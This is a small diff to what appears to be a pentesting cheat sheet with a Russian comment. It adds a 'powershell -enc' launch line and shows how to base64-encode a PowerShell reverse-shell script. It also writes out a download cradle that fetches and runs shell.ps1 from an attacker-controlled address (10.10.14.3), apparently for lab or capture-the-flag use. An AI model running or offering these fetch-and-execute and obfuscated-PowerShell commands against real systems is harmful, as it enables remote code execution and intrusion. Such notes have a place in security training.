@@ -55,6 +55,8 @@ cat sharp.zip.b64 | base64 -d > sharp_r.zip
 
 cat shell_9001.ps1| iconv -t utf-16le | base64 -w 0
 
+powershell -enc ".....base64..........."
+
 # Кодируем скрипт в базе64 utf16 и запускаем
 
 echo -n "IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.3/shell.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
